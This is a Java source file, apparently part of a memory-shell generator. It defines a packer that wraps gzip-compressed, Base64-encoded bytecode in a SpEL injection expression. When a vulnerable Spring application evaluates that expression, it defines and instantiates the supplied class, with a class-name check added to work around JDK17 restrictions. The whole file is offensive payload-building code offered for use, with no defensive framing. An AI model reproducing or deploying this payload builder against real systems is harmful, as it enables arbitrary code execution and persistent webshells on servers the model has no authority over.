package org.leo.jmg.mem.packer.spel;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;

@PackerMeta(name = "SpELSpringGzipJDK17", group = "SpEL", order = 3)
public class SpELSpringGzipJDK17Packer implements Packer {
    String template = "T(org.springframework.cglib.core.ReflectUtils).defineClass('{{className}}',T(org.springframework.util.StreamUtils).copyToByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(T(org.springframework.util.Base64Utils).decodeFromString('{{base64Str}}')))),new java.net.URLClassLoader(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader()),null,T(java.lang.Class).forName('org.springframework.expression.ExpressionParser')).newInstance()";

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        String className = config.getClassName();
        assertClassNameValid(className);
        return template.replace("{{className}}", className)
                .replace("{{base64Str}}", PackerRegistry.getOrThrow("GzipBase64").pack(config));
    }

    public static void assertClassNameValid(String className) {
        String packageName = className.substring(0, className.lastIndexOf("."));
        if (!"org.springframework.expression".equals(packageName)) {
            throw new UnsupportedOperationException(className + " is not supported, please set className in same package org.springframework.expression, " +
                    "for example, org.springframework.expression.CommonUtil, org.springframework.expression.sub.CommonUtil will also not work");
        }
    }
}
